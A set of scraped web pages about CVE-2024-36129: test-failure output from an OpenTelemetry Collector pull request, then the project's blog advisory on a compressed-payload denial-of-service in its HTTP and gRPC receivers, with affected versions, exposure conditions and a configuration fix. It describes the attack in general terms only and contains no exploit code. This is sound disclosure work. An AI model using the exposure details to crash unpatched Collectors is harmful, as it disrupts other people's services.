        	Error Trace:	/home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/confighttp_test.go:1328
        	            				/usr/lib/golang/src/net/http/server.go:2166
        	            				/home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/compression.go:163
        	            				/home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/confighttp.go:455
        	            				/usr/lib/golang/src/net/http/server.go:2166
        	            				/home/jpkroehling/go/pkg/mod/go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp@v0.52.0/handler.go:212
        	            				/home/jpkroehling/go/pkg/mod/go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp@v0.52.0/handler.go:73
        	            				/usr/lib/golang/src/net/http/server.go:2166
        	            				/home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/clientinfohandler.go:26
        	            				/usr/lib/golang/src/net/http/server.go:3137
        	            				/usr/lib/golang/src/net/http/server.go:2039
        	            				/usr/lib/golang/src/runtime/asm_amd64.s:1695
        	Error:
        	Test:       	TestServerWithDecompression
    /home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/confighttp_test.go:1357:
        	Error Trace:	/home/jpkroehling/Projects/src/github.com/open-telemetry/opentelemetry-collector/config/confighttp/confighttp_test.go:1357
        	Error:      	Not equal:
        	            	expected: 200
        	            	actual  : 400
        	Test:       	TestServerWithDecompression
FAIL
FAIL	go.opentelemetry.io/collector/config/confighttp	0.036s
FAIL
```

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>

---------

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>
```

This was referenced Jul 26, 2024

[Added examples for systemd units
uniget-org/tools#6141](/uniget-org/tools/pull/6141)
 Merged

[Added config and host network
uniget-org/tools#6267](/uniget-org/tools/pull/6267)
 Merged

[Separated docker-compose-systemd from binary
uniget-org/tools#6303](/uniget-org/tools/pull/6303)
 Merged

[![@zhijie-yang](https://avatars.githubusercontent.com/u/24251674?s=40&v=4)](/zhijie-yang)
[zhijie-yang](/zhijie-yang)
mentioned this pull request
[Aug 29, 2024](#ref-issue-2493837307)

[ubuntu/grafana-agent:0.40.4-22.04\_stable (ubuntu 22.04) - Trivy Report - 2024-08-29 10:45:52.621829889 +0200 CEST m=+0.640145445
zhijie-yang/workflow-playground#5](/zhijie-yang/workflow-playground/issues/5)

Closed

[![@crobert-1](https://avatars.githubusercontent.com/u/92119472?s=40&v=4)](/crobert-1)
[crobert-1](/crobert-1)
mentioned this pull request
[Sep 6, 2024](#ref-pullrequest-2510858027)

[[chore][confighttp] Update docs for max\_request\_body\_size default value
#11075](/open-telemetry/opentelemetry-collector/pull/11075)
 Closed

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-telemetry%2Fopentelemetry-collector%2Fpull%2F10289)

Reviewers

[![@MovieStoreGuy](https://avatars.githubusercontent.com/u/30928402?s=40&v=4)](/MovieStoreGuy) [MovieStoreGuy](/MovieStoreGuy)

MovieStoreGuy approved these changes

[![@mx-psi](https://avatars.githubusercontent.com/u/5502710?s=40&v=4)](/mx-psi) [mx-psi](/mx-psi)

mx-psi approved these changes

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

 [**v0.102.0**](/open-telemetry/opentelemetry-collector/milestone/81 "v0.102.0")

Development

Successfully merging this pull request may close these issues.

3 participants

[![@jpkrohling](https://avatars.githubusercontent.com/u/13387?s=52&v=4)](/jpkrohling) [![@mx-psi](https://avatars.githubusercontent.com/u/5502710?s=52&v=4)](/mx-psi) [![@MovieStoreGuy](https://avatars.githubusercontent.com/u/30928402?s=52&v=4)](/MovieStoreGuy)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from opentelemetry.io_760ae993_20250111_025525.html ===
[The OpenTelemetry LogoOpenTelemetry](/)

* [Docs](/docs/)
* [Ecosystem](/ecosystem/)
* [Status](/status/)
* [Community](/community/)
* [Blog](/blog/)
* English
  + [Español](/es/)
  + [Français](/fr/)
  + [日本語 (Japanese)](/ja/)
  + [Português](/pt/)
  + [中文 (Chinese)](/zh/)
* + Light
  + Dark
  + Auto
English

* [Español](/es/)
* [Français](/fr/)
* [日本語 (Japanese)](/ja/)
* [Português](/pt/)
* [中文 (Chinese)](/zh/)

* [Blog](/blog/)
  + [2025](/blog/2025/)
  + [2024](/blog/2024/)
    - [Fuzzing Audit Results](/blog/2024/fuzzing-audit-results/ "OpenTelemetry Collector Completes Fuzzing Audit")
    - [Humans of OTel NA 2024](/blog/2024/humans-of-otel-na-2024/ "The Humans of OpenTelemetry - KubeCon NA 2024")
    - [OTel-docs Survey](/blog/2024/otel-docs-survey/ "Insights from the OpenTelemetry Docs Usability Survey")
    - [Year in review](/blog/2024/year-in-review/ "OpenTelemetry.io 2024 review")
    - [OTel-compliant Java logs from files](/blog/2024/collecting-otel-compliant-java-logs-from-files/ "Collecting OpenTelemetry-compliant Java logs from files")
    - [OTel for GenAI](/blog/2024/otel-generative-ai/ "OpenTelemetry for Generative AI")
    - [OpenTelemetry Community Awards Winners](/blog/2024/community-awards-winners/ "Announcing 2024 OpenTelemetry Community Awards Winners")
    - [KubeCon NA '24](/blog/2024/kubecon-na/ "Join us for OpenTelemetry Talks and Activities at KubeCon NA 2024")
    - [OpenTelemetry Community Awards](/blog/2024/community-awards/ "2024 OpenTelemetry Community Awards")
    - [Profiling state](/blog/2024/state-profiling/ "The State of Profiling")
    - [2024 GC Election Results](/blog/2024/gc-election-results/ "Announcing the 2024 Governance Committee Election Results")
    - [2024 GC Candidates](/blog/2024/gc-candidates/ "Announcing the 2024 OpenTelemetry Governance Committee Election Candidates")
    - [Spring Starter stable](/blog/2024/spring-starter-stable/ "The OpenTelemetry Spring Boot starter is now stable")
    - [OpenTelemetry Arrow in Production](/blog/2024/otel-arrow-production/ "OpenTelemetry Protocol with Apache Arrow in Production")
    - [Prometheus and OpenTelemetry](/blog/2024/prom-and-otel/ "Prometheus and OpenTelemetry - Better Together")
    - [2024 GC Election](/blog/2024/gc-elections/ "Announcing the 2024 OpenTelemetry Governance Committee Election")
    - [Planned Migration for go.opentelemetry.io](/blog/2024/go-opentelemetry-io/)
    - [Multilingual website](/blog/2024/docs-localized/ "OpenTelemetry website goes multilingual!")
    - [Behind the scenes of the OpenTelemetry Governance Committee](/blog/2024/otel-governance/)
    - [Prometheus Compatibility Survey](/blog/2024/prometheus-compatibility-survey/ "Insights from the Prometheus Compatibility Survey")
    - [Security Audit Results](/blog/2024/security-audit-results/ "OpenTelemetry Security Audit Published")
    - [KubeCon China 2024](/blog/2024/kubecon-china/ "OpenTelemetry Talks at KubeCon China 2024")
    - [A new default bind address for the Collector](/blog/2024/hardening-the-collector-one/ "Hardening the Collector Episode 1: A new default bind address")
    - [OpenTelemetry Getting Started Survey](/blog/2024/otel-get-started-survey/ "Insights from the OpenTelemetry Getting Started Survey")
    - [Humans of OTel EU 2024](/blog/2024/humans-of-otel-eu-2024/ "The Humans OpenTelemetry - KubeCon EU 2024")
    - [Elastic Contributes Profiling Agent](/blog/2024/elastic-contributes-continuous-profiling-agent/ "Elastic Contributes its Continuous Profiling Agent to OpenTelemetry")
    - [New OTel features in Envoy and Istio](/blog/2024/new-otel-features-envoy-istio/ "Observability at the Edge: New OTel features in Envoy and Istio")
    - [Collector vulnerability CVE-2024-36129](/blog/2024/cve-2024-36129/ "Security vulnerability in OTel Collector confighttp and configgrpc (CVE-2024-36129)")
    - [LLM Observability](/blog/2024/llm-observability/ "An Introduction to Observability for LLM-based applications using OpenTelemetry")
    - [Go Contrib modules ownership](/blog/2024/go-contrib-removal/ "Abandoned Go Contrib modules need code owners or will be removed")
    - [Java Metric Systems Compared](/blog/2024/java-metric-systems-compared/ "OpenTelemetry Java Metrics Performance Comparison")
    - [Collector container log parser](/blog/2024/otel-collector-container-log-parser/ "Introducing the new container log parser for OpenTelemetry Collector")
    - [OTel Operator Q&A](/blog/2024/otel-operator-q-and-a/ "Things You Might Not Have Known About the OpenTelemetry Operator - An OTel Operator Q&A")
    - [OpenTelemetry Collector Survey](/blog/2024/otel-collector-survey/ "Insights from the OpenTelemetry Collector Survey")
    - [Collector Roadmap](/blog/2024/collector-roadmap/ "The roadmap to v1 for the OpenTelemetry Collector")
    - [Understanding OTel Errors](/blog/2024/otel-errors/ "Dude, where's my error? How OpenTelemetry records errors")
    - [Collectors at scale with Ansible](/blog/2024/scaling-collectors/ "Manage OpenTelemetry Collectors at scale with Ansible")
    - [Profiling support](/blog/2024/profiling/ "OpenTelemetry announces support for profiling")
    - [Getting started with otelsql](/blog/2024/getting-started-with-otelsql/ "Getting started with otelsql, the OpenTelemetry instrumentation for Go SQL")
    - [OTel Collector Antipatterns](/blog/2024/otel-collector-anti-patterns/ "OpenTelemetry Collector Antipatterns")
    - [KubeCon EU '24](/blog/2024/kubecon-eu/ "Join us for OpenTelemetry Talks and Activities at KubeCon + CloudNativeCon Europe 2024")
    - [Skyscanner using OTel Demo](/blog/2024/demo-skyscanner/ "Making observability fun: How we increased engineers' confidence in incident management using a game")
    - [Outreachy Internship](/blog/2024/outreachy-how-why-sakshi/ "Outreachy - How, When & Why?")
  + [2023](/blog/2023/)
    - [Humans of OTel](/blog/2023/humans-of-otel/ "The Humans of OpenTelemetry")
    - [Observe Spring Native](/blog/2023/spring-native/ "Observe your Spring Native Image application with OpenTelemetry")
    - [OTel in Focus Wrap-Up](/blog/2023/otel-in-focus-break/ "OpenTelemetry in Focus: Wrapping Up a Successful 2023")
    - [Any Metric Receiver](/blog/2023/any-metric-receiver/ "Receive any custom metric with the OpenTelemetry Collector")
    - [Performance benchmarks](/blog/2023/perf-testing/ "OTel component performance benchmarks")
    - [Python Logs Collection](/blog/2023/logs-collection/ "Collecting Logs with OpenTelemetry Python")
    - [OTel integration for Otterize network mapper](/blog/2023/otterize-otel/ "Adding OpenTelemetry support to the Otterize network mapper")
    - [OpenTelemetry Protocol with Apache Arrow](/blog/2023/otel-arrow/ "Achieve a 10x Reduction in Telemetry Traffic Using OpenTelemetry Protocol with Apache Arrow")
    - [Contribfest at KubeCon NA](/blog/2023/contribfest-na/ "OpenTelemetry Contribfest at KubeCon North America 2023")
    - [OpenTelemetry in Cloud Foundry](/blog/2023/cloud-foundry/ "Experience Report: Adopting OpenTelemetry for Metrics in Cloud Foundry")
    - [Demo 1.6 Released](/blog/2023/otel-demo-16/ "OpenTelemetry Demo 1.6 released")
    - [Tyk API Gateway's Native OpenTelemetry Integration](/blog/2023/tyk-api-gateway/)
    - [HTTP semconv are stable](/blog/2023/http-conventions-declared-stable/ "HTTP semantic conventions declared stable")
    - [Integrations Welcome!](/blog/2023/integrations/ "OpenTelemetry Integrations Welcome!")
    - [OTel in Focus 2023/10](/blog/2023/otel-in-focus-10/ "OpenTelemetry in Focus, October 2023")
    - [2023 GC Election Results](/blog/2023/gc-election-results/ "Announcing the 2023 Governance Committee Election Results")
    - [OpAMP Status](/blog/2023/opamp-status/ "Open Agent Management Protocol (OpAMP) State of the Nation 2023")
    - [The Future of Observability Panel](/blog/2023/euwg-future-of-observability-panel/ "OTel End User Working Group Presents: The Future of Observability Panel Discussion")
    - [2023 GC Candidates](/blog/2023/gc-candidates/ "Final list of candidates for the 2023 OpenTelemetry Governance Committee")
    - [Synthetic HTTP testing](/blog/2023/synthetic-testing/ "Portable Synthetic HTTP Testing with OpenTelemetry")
    - [Go Metric SDK is Stable](/blog/2023/otel-go-metrics-sdk-stable/ "First stable release of OTel Go metric SDK")
    - [KubeCon NA '23](/blog/2023/kubecon-na/ "Join us for OpenTelemetry Talks and Activities at KubeCon NA 2023")
    - [OTel in Focus 2023/09](/blog/2023/otel-in-focus-09/ "OpenTelemetry in Focus, September 2023")
    - [2023 GC Election](/blog/2023/gc-elections/ "Announcing the 2023 OpenTelemetry Governance Committee Election")
    - [Contributing to OTel](/blog/2023/contributing-to-otel/ "Thinking about contributing to OpenTelemetry? Here's how I did it.")
    - [.NET Automatic Instrumentation v1.0.0](/blog/2023/otel-dotnet-auto-instrumentation/ "OpenTelemetry .NET Automatic Instrumentation reaches version 1.0.0")
    - [Jaeger Collector Exporter Migration](/blog/2023/jaeger-exporter-collector-migration/ "Migrating away from the Jaeger exporter in the Collector")
    - [PHP Release Candidate](/blog/2023/php-rc-release/ "Opentelemetry PHP Release Candidate")
    - [OTel in Focus 2023/08](/blog/2023/otel-in-focus-08/ "OpenTelemetry in Focus, August 2023")
    - [OTel in Focus 2023/07](/blog/2023/otel-in-focus-07/ "OpenTelemetry in Focus, July 2023")
    - [Testing the OTel Demo](/blog/2023/testing-otel-demo/ "Trace-based Testing the OpenTelemetry Demo")
    - [End-User Q&A: Migrating to OTel at Lightstep](/blog/2023/end-user-q-and-a-04/ "End-User Q&A Series: Migrating to OTel at Lightstep")
    - [OTel in Focus 2023/06](/blog/2023/otel-in-focus-06/ "OpenTelemetry in Focus, June 2023")
    - [End-User Q&A: OTel at Farfetch](/blog/2023/end-user-q-and-a-03/ "End-User Q&A Series: Using OTel at Farfetch")
    - [K8s Runtime Observability](/blog/2023/k8s-runtime-observability/ "Creating a Kubernetes Cluster with Runtime Observability")
    - [OTel in Focus 2023/05](/blog/2023/otel-in-focus-05/ "OpenTelemetry in Focus, May 2023")
    - [OTel Lambda Updates](/blog/2023/lambda-release/ "OpenTelemetry Updates Lambda Support")
    - [Exponential Histograms](/blog/2023/exponential-histograms/)
    - [Histograms vs Summaries](/blog/2023/histograms-vs-summaries/)
    - [End-User Discussions April 2023](/blog/2023/end-user-discussions-04/ "OpenTelemetry End-User Discussions Summary for April 2023")
    - [Why Histograms?](/blog/2023/why-histograms/)
    - [OTel in Focus 2023/04](/blog/2023/otel-in-focus-04/ "OpenTelemetry in Focus, April 2023")
    - [Sunsetting OpenCensus](/blog/2023/sunsetting-opencensus/)
    - [OTel Demo Updates](/blog/2023/demo-birthday/ "The OpenTelemetry Demo Turns 1(.4)")
    - [ECS and OTel SemConv Convergence](/blog/2023/ecs-otel-semconv-convergence/ "Announcing the Elastic Common Schema (ECS) and OpenTelemetry Semantic Convention Convergence")
    - [KubeCon EU '23](/blog/2023/kubecon-eu/ "Join us for OpenTelemetry Talks and Activities at KubeCon EU 2023")
    - [OTel in Focus 2023/03](/blog/2023/otel-in-focus-03/ "OpenTelemetry in Focus, March 2023")
    - [End-User Discussions Mar 2023](/blog/2023/end-user-discussions-03/ "OpenTelemetry End-User Discussions Summary for March 2023")
    - [PHP Auto-Instrumentation](/blog/2023/php-auto-instrumentation/ "OpenTelemetry PHP Auto-Instrumentation")
    - [End-User Q&A: OTel at Uplight](/blog/2023/end-user-q-and-a-02/ "End-User Q&A Series: Using OTel at Uplight")
    - [End-User Discussions Feb 2023](/blog/2023/end-user-discussions-02/ "OpenTelemetry End-User Discussions Summary for February 2023")
    - [OTel in Focus 2023/02](/blog/2023/otel-in-focus-02/ "OpenTelemetry in Focus, February 2023")
    - [New APAC Collector-SIG meetings](/blog/2023/new-apac-meetings/)
    - [End-User Q&A: OTel with GraphQL](/blog/2023/end-user-q-and-a-01/ "End-User Q&A Series: Using OTel with GraphQL")
    - [Submitting a CFP](/blog/2023/submitting-your-first-conference-talk/ "Submitting Your First Conference Talk")
    - [Outreachy Call for participation '23](/blog/2023/outreachy-may-cohort/ "Call for participation - Outreachy May 2023")
    - [OTel in Focus 2023/01](/blog/2023/otel-in-focus-01/ "OpenTelemetry in Focus, January 2023")
    - [HTTP semantic conventions](/blog/2023/http-conventions-stability/ "Final push to HTTP semantic convention stability")
    - [PHP Beta Release](/blog/2023/php-beta-release/ "Opentelemetry PHP Beta Release")
    - [End-User Discussions Jan 2023](/blog/2023/end-user-discussions-01/ "OpenTelemetry End-User Discussions Summary for January 2023")
    - [JMX Metric Insight](/blog/2023/jmx-metric-insight/ "Gaining JMX Metric Insights with the OpenTelemetry Java Agent")
  + [2022](/blog/2022/)
    - [eBay OpenTelemetry](/blog/2022/why-and-how-ebay-pivoted-to-opentelemetry/ "Why and How eBay Pivoted to OpenTelemetry")
    - [OTel Demo App on Nomad](/blog/2022/otel-demo-app-nomad/ "Running the OpenTelemetry Demo App on HashiCorp Nomad")
    - [APAC End User Discussion Group](/blog/2022/end-user-discussion-group-apac/ "End User Discussion Group: New APAC Sessions Announcement!")
    - [Front-end Overhaul Demo](/blog/2022/frontend-overhaul/ "Front-end Overhaul of the OpenTelemetry Demo (Go to Next.js)")
    - [Jaeger OTLP support](/blog/2022/jaeger-native-otlp/ "Supporting Jaeger with native OTLP")
    - [Project Update](/blog/2022/kubecon-na-project-update/ "OpenTelemetry Project and Roadmap Update from Kubecon")
    - [Demo GA Release](/blog/2022/announcing-opentelemetry-demo-release/ "OpenTelemetry Demo now Generally Available!")
    - [22 GC Election Results](/blog/2022/gc-election-results/ "Announcing the 2022 Governance Committee Election Results")
    - [OpAMP service usage](/blog/2022/opamp/ "Using OpenTelemetry OpAMP to modify service telemetry on the go")
    - [Collector builder with GCP](/blog/2022/collector-builder-sample/ "Using the Collector Builder with Sample Configs on GCP")
    - [2022 GC Candidates](/blog/2022/gc-candidates/ "Final list of candidates for the 2022 OpenTelemetry Governance Committee")
    - [Kubecon NA '22](/blog/2022/kubecon-na/ "Join us for OpenTelemetry Talks and Activities at Kubecon NA 2022")
    - [OTel Unplugged '22](/blog/2022/otel-unplugged-kubecon-na/ "OTel Unplugged at KubeCon NA 2022!")
    - [Community Manager](/blog/2022/announcing-community-manager/ "Announcing the OpenTelemetry Community Manager")
    - [Tail Sampling](/blog/2022/tail-sampling/ "Tail Sampling with OpenTelemetry: Why it’s useful, how to do it, and what to consider")
    - [Debug OTel with OTel](/blog/2022/debug-otel-with-otel/ "How we used OpenTelemetry to fix a bug in OpenTelemetry")
    - [2022 GC Election](/blog/2022/gc-elections/ "Announcing the 2022 OpenTelemetry Governance Committee Election")
    - [Exposing a Collector](/blog/2022/k8s-otel-expose/ "Exposing a Collector for cross cluster communication")
    - [Instrumenting Apache Kafka clients](/blog/2022/instrument-kafka-clients/ "Instrumenting Apache Kafka clients with OpenTelemetry")
    - [Exponential Histograms](/blog/2022/exponential-histograms/ "Exponential Histograms: Better Data, Zero Configuration")
    - [Go App Instrumentation](/blog/2022/go-web-app-instrumentation/ "Go Web-app Instrumentation")
    - [Instrument Nginx](/blog/2022/instrument-nginx/ "Learn how to instrument NGINX with OpenTelemetry")
    - [OTel in Practice](/blog/2022/otel-in-practice/ "OpenTelemetry in Practice: Kubernetes & the Collector")
    - [.NET Auto-instrumentation Metrics](/blog/2022/dotnet-instrumentation-metrics/ "OpenTelemetry .NET Automatic Instrumentation metric signal support")
    - [End User Resources](/blog/2022/new-end-user-resources/ "Introducing new resources for OpenTelemetry end users to connect and discover best practices")
    - [Kubernetes metadata](/blog/2022/k8s-metadata/ "Improved troubleshooting using k8s metadata")
    - [OpenTelemetry Community Demo](/blog/2022/demo-announcement/ "Announcing a Community Demo for OpenTelemetry")
    - [Instrument Apache Http Server](/blog/2022/instrument-apache-httpd-server/ "Learn how to instrument Apache Http Server with OpenTelemetry")
    - [Metrics RCs](/blog/2022/metrics-announcement/ "OpenTelemetry Metrics Release Candidates")
    - [.NET Auto-instrumentation Beta](/blog/2022/dotnet-instrumentation-first-beta/ "OpenTelemetry .NET Automatic Instrumentation Releases its first Beta")
    - [Tracing in Knative](/blog/2022/knative/ "Distributed tracing in Knative")
    - [Apache APISIX-Opentelemetry Integration](/blog/2022/apisix/ "Apache APISIX Integrates with OpenTelemetry to Collect Tracing Data")
    - [OpenTelemetry Tuesdays, Signing Off!](/blog/2022/otel-tuesday-v1-sunset/)
    - [TroublesShooting Node.js Tracing Issues](/blog/2022/troubleshooting-nodejs/ "Checklist for TroublesShooting OpenTelemetry Node.js Tracing Issues")
    - [Welcome](/blog/2022/welcome/ "Welcome to the OpenTelemetry blog")
    - [Erlang/Elixir, JS, and Ruby 1.0](/blog/2022/v1.0-trio/ "OpenTelemetry Erlang/Elixir, Javascript, and Ruby v1.0 (Medium)")
  + [2021](/blog/2021/)
    - [Auto-instrumentation in Kubernetes](/blog/2021/auto-instrumentation-k8s/ "Using OpenTelemetry auto-instrumentation/agents in Kubernetes (Medium)")
    - [2021 Governance Committee](/blog/2021/otel-gc/ "Welcome to the incoming 2021 OpenTelemetry Governance Committee (Medium)")
    - [C++ 1.0](/blog/2021/cpp/ "OpenTelemetry C++ v1.0 — what’s there, and what next (Medium)")
    - [Trace-Based Testing with Malabi](/blog/2021/malabi/ "Trace-Based Testing with OpenTelemetry: Meet Open Source Malabi (Medium)
      ")
    - [2021 GC election](/blog/2021/gc-election/ "Announcing the 2021 OpenTelemetry Governance Committee Election (Medium)")
    - [Collector GA release](/blog/2021/collector/ "OpenTelemetry Collector achieves Tracing stability milestone (Medium)")
    - [Swift 1.0 Beta](/blog/2021/swift/ "OpenTelemetry Swift 1.0 Beta (Medium)")
    - [Python 1.0](/blog/2021/python/ "Announcing OpenTelemetry Python 1.0 (Medium)")
    - [Women's day 2021](/blog/2021/womens-day/ "OpenTelemetry Observes International Women's Day 2021 (Medium)")
  + [2019](/blog/2019/)
    - [Governance Committee Explained](/blog/2019/opentelemetry-governance-committee-explained/ "OpenTelemetry Governance Committee Explained")
 [View page source](https://github.com/open-telemetry/opentelemetry.io/tree/main/content/en/blog/2024/cve-2024-36129.md)
 [Edit this page](https://github.com/open-telemetry/opentelemetry.io/edit/main/content/en/blog/2024/cve-2024-36129.md)
 [Create child page](https://github.com/open-telemetry/opentelemetry.io/new/main/content/en/blog/2024?filename=change-me.md&value=---%0Atitle%3A+%22Long+Page+Title%22%0AlinkTitle%3A+%22Short+Nav+Title%22%0Aweight%3A+100%0Adescription%3A+%3E-%0A+++++Page+description+for+heading+and+indexes.%0A---%0A%0A%23%23+Heading%0A%0AEdit+this+template+to+create+your+new+page.%0A%0A%2A+Give+it+a+good+name%2C+ending+in+%60.md%60+-+e.g.+%60getting-started.md%60%0A%2A+Edit+the+%22front+matter%22+section+at+the+top+of+the+page+%28weight+controls+how+its+ordered+amongst+other+pages+in+the+same+directory%3B+lowest+number+first%29.%0A%2A+Add+a+good+commit+message+at+the+bottom+of+the+page+%28%3C80+characters%3B+use+the+extended+description+field+for+more+detail%29.%0A%2A+Create+a+new+branch+so+you+can+preview+your+new+file+and+request+a+review+via+Pull+Request.%0A)
 [Create documentation issue](https://github.com/open-telemetry/opentelemetry.io/issues/new?title=Security%20vulnerability%20in%20OTel%20Collector%20confighttp%20and%20configgrpc%20%28CVE-2024-36129%29)

* [Am I affected?](#am-i-affected)
* [What does it mean to me?](#what-does-it-mean-to-me)
* [Lessons learned](#lessons-learned)
* [Acknowledgements](#acknowledgements)

1. [Blog](/blog/)
2. [2024](/blog/2024/)
3. Collector vulnerability CVE-2024-36129
# Security vulnerability in OTel Collector confighttp and configgrpc (CVE-2024-36129)

By **[Juraci Paixão Kröhling](https://github.com/jpkrohling) (OpenTelemetry, Grafana Labs), [Pablo Baeyens](https://github.com/mx-psi) (OpenTelemetry, Datadog)** |
Wednesday, June 05, 2024

On our path toward graduation, the OpenTelemetry project is currently undergoing
a security audit sponsored by the [CNCF](https://www.cncf.io/), facilitated by
[OSTIF](https://ostif.org/), and performed by
[7ASecurity](https://7asecurity.com/). During this process, we have received a
few ideas about things that we could do better, like using specific compiler
flags when preparing our
[OpenTelemetry Collector binaries](https://github.com/open-telemetry/opentelemetry-collector-releases/releases).
On 31 May 2024, we received
[a more serious report](https://github.com/open-telemetry/opentelemetry-collector/security/advisories/GHSA-c74f-6mfw-mm4v):
a malicious user could cause a denial of service (DoS) when using a specially
crafted HTTP or gRPC request. The advisory was assigned the following CVE
identifier: CVE-2024-36129.

When sending an HTTP request with a compressed payload, the Collector would
verify only whether the compressed payload is beyond a certain limit, but not
its uncompressed version. A malicious payload could then send a
“[compressed bomb](https://en.wikipedia.org/wiki/Zip_bomb)”, causing the
Collector to crash.

Similarly, when sending a gRPC request using zstd compression, the decompression
mechanism would not respect the limits imposed by gRPC, also causing the
Collector to crash while decompressing the malicious payload.

A few business hours after the report, on 03 June 2024, Collector developers
were able to reproduce the report related to HTTP and worked together on a fix
that
[got merged the same day](https://github.com/open-telemetry/opentelemetry-collector/pull/10289).
Given the high score of this issue, we’ve decided to hold the release that would
have happened on the same day,
[completing it](https://github.com/open-telemetry/opentelemetry-collector-releases/releases/tag/v0.102.0)
on 04 June 2024 instead.

After the release, we got a confirmation that gRPC with zstd was also affected.
Within a few business hours of the confirmation, we worked on a fix that also
[got merged the same day](https://github.com/open-telemetry/opentelemetry-collector/pull/10323).
[We released v0.102.1](https://github.com/open-telemetry/opentelemetry-collector-releases/releases/tag/v0.102.1)
right after that.

## Am I affected?

You are affected by this vulnerability if you have an OpenTelemetry Collector
with one or more HTTP or gRPC receivers on a public port, such as the OTLP
Receiver with the “HTTP” or “gRPC” protocol enabled (typically on ports 4318 and
4317, respectively) AND the receiver has version 0.102.0 or below. The
vulnerability is exploitable only by attackers who can send payloads to your
HTTP/gRPC endpoint(s). This usually means that the port needs to be exposed to
the public internet or another network segment that’s available to the attacker.

Note that if you require authentication, an attacker would need to have valid
credentials in order to exploit the vulnerability using the HTTP protocol. For
gRPC, the exploitable code is executed before authentication.

## What does it mean to me?

If you manage a Collector that has an interface to the public internet, you
should upgrade it as soon as feasible, and consider setting the parameter
`max_request_body_size` on HTTP receivers, such as the OTLP receiver, to a value
that makes sense to your workload. Up to v0.101.0, this setting applied only to
the payload size sent by the client, which could often be compressed.

Starting from v0.102.0, this setting applies to uncompressed, compressed, and
decompressed payload sizes and we are establishing a default value of 20 MiB for
this. This new default characterizes a breaking change, as clients sending
payloads bigger than 20 MiB will start seeing an error. While we believe most
authentic requests will be way within this limit, it’s still wise to monitor
your Collector for increased error rates after this update. Here’s an example of
a configuration setting a different limit to this field:

```
receivers:
  otlp:
    protocols:
      http:
        endpoint: localhost:4318
        max_request_body_size: 10485760 # 10 MiB

```

For gRPC receivers, it’s sufficient to upgrade to v0.102.1, as there’s a default
value being applied to the message size already: 4 MiB.

If your Collector instances are receiving data only from trusted clients, like
your own applications, you are still encouraged to upgrade to the latest
Collector version but you can do it at your regular pace.

If you are using a custom distribution and building it with the
[OpenTelemetry Collector Builder (ocb)](/docs/collector/custom-collector/), you
can add a
[“replaces”](https://github.com/open-telemetry/opentelemetry-collector/tree/main/cmd/builder#configuration)
entry pointing to the latest version of the
[confighttp](http://go.opentelemetry.io/collector/config/confighttp) and
[configgrpc](http://go.opentelemetry.io/collector/config/configgrpc) Go module.
If your base Collector version is at v0.96.0 or higher, we do not expect any
compatibility issues by just bumping to the latest version.

## Lessons learned

During this process, we found a couple of gaps in the telemetry for the
Collector, as well as to the options we provide to Collector admins. Concretely,
we noticed that we do not have a good way to verify what’s the distribution of
request sizes received by the Collector, which would have been useful to
determine whether the change would break clients for a given Collector. We also
noticed that we don’t provide a way for admins to completely disable
compression, which would be a good way to mitigate an attack without having to
upgrade the Collector. We are working to fill those gaps over the next releases.

We are also working on stabilizing the `component.UseLocalHostAsDefaultHost`
feature gate to reduce exposure of all Collector endpoints by default. This
feature gate was motivated by a previous,
[similar vulnerability on Go’s standard library](https://github.com/advisories/GHSA-4374-p667-p6c8)
and has been in alpha for several months. You can follow the discussion
surrounding stabilization at
[issue 8510](https://github.com/open-telemetry/opentelemetry-collector/issues/8510).

## Acknowledgements

This issue was identified by [Miroslav Stampar](https://github.com/stamparm/),
from 7ASecurity. We’d like to thank 7ASecurity for the responsible reporting of
this vulnerability.

* [←Previous](/blog/2024/llm-observability/)
* [Next→](/blog/2024/new-otel-features-envoy-istio/)

Last modified July 24, 2024: [Fix spelling issues, update page-local dictionaries (#4877) (78f1d31f)](https://github.com/open-telemetry/opentelemetry.io/commit/78f1d31f5612ae75df7ffb06702babaf0cbddb7a)

©
2019–2025
OpenTelemetry Authors | Docs [CC BY 4.0](https://creativecommons.org/licenses/by/4.0)All Rights Reserved

=== Content from github.com_c84b3bef_20250111_025524.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-telemetry%2Fopentelemetry-collector%2Fsecurity%2Fadvisories%2FGHSA-c74f-6mfw-mm4v)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
